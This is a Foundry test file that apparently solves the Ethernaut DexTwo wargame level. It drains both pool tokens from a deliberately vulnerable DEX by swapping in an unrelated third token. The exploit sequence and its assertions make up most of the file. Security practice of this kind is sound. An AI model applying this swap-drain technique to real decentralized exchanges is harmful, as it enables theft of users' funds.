// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/DexTwo.sol";

contract MiddleMan {
    function attack(address prey) public {}
}

contract DexTwoTest is Test {
    DexTwo instance;
    address alice = makeAddr("Alice");

    function setUp() public {
        instance = new DexTwo();
    }

    function test() public {
        SwappableTokenTwo token1 = new SwappableTokenTwo(
            address(instance),
            "Token1",
            "T1",
            1000
        );
        SwappableTokenTwo token2 = new SwappableTokenTwo(
            address(instance),
            "Token2",
            "T2",
            1000
        );
        SwappableTokenTwo token3 = new SwappableTokenTwo(
            address(instance),
            "Token3",
            "T3",
            1000
        );

        instance.setTokens(address(token1), address(token2));

        token1.transfer(alice, 10);
        token2.transfer(alice, 10);

        token1.transfer(address(instance), 100);
        token2.transfer(address(instance), 100);
        token3.transfer(address(instance), 100);

        vm.startPrank(alice);
        token1.approve(address(this), alice, 90);
        token1.transferFrom(address(this), alice, 90);
        token1.approve(alice, address(instance), 100);
        instance.swap(address(token1), address(token2), 100);

        token3.approve(address(this), alice, 300);
        token3.transferFrom(address(this), alice, 300);
        token3.approve(alice, address(instance), 300);
        token3.transfer(address(instance), 100);
        instance.swap(address(token3), address(token1), 200);

        assertEq(token1.balanceOf(alice), 200);
        assertEq(token1.balanceOf(address(instance)), 0);
        assertEq(token2.balanceOf(alice), 110);
        assertEq(token2.balanceOf(address(instance)), 0);
    }
}
